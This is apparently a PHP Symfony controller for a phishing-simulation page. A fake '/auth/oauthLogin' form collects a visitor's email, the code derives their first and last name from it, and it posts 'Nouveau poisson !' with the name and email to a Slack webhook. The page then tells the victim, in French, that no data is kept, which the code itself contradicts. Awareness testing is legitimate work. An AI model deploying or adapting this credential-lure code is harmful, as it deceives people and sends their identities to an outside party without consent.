<?php

namespace App\Controller;

use App\Form\FormType;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

class FormController extends AbstractController
{
    private const URL_WEBHOOK = 'https://hooks.slack.com/services';

    public function __construct(
        private HttpClientInterface $client,
        private string $keyT,
        private string $keyB,
        private string $token,
    ) {
    }

    #[Route('/auth/oauthLogin')]
    public function login(Request $request): Response
    {
        $form = $this->createForm(FormType::class);
        $form->handleRequest($request);
        if ($form->isSubmitted() && $form->isValid()) {
            $data['email'] = $form->getData()['email'];

            return $this->redirectToRoute('app_form_attacked', $data);
        }

        return $this->render('form/index.html.twig', [
            'form' => $form->createView()
        ]);
    }

    #[Route('/attacked')]
    public function attacked(Request $request): Response
    {
        $text = "Salut %s %s ! Tu viens d'être attaqué par une cyberattaque créée de toute pièces par Jhack Chirac ! Pas de panique, aucune donnée n'est conservée et tu n'as aucune crainte à avoir !";
        $email = $request->query->get('email');
        $formattedEmail = strtok($email, '@');
        $emailExploded = explode('.', $formattedEmail);

        if (2 !== count($emailExploded)) {
            return $this->render('form/trapped.html.twig', ['text' => $text]);
        }

        $firstName = ucwords(str_replace('-', ' ', array_shift($emailExploded)));
        $lastName = ucwords(str_replace('-', ' ', end($emailExploded)));

        $payload['text'] = sprintf(
            'Nouveau poisson ! %s %s s\'est fait avoir par Jhack Chirac ! Son email : %s',
            $lastName,
            $firstName,
            $email
        );

        try {
            $this->client->request(
                'POST',
                sprintf('%s/%s/%s/%s', self::URL_WEBHOOK, $this->keyT, $this->keyB, $this->token),
                [
                    'json' => $payload,
                ]
            );
        } catch (\Exception | TransportExceptionInterface $e) {
            error_log($e->getMessage());
        }

        return $this->render('form/trapped.html.twig', [
            'text' => sprintf($text, $lastName, $firstName)
        ]);
    }
}
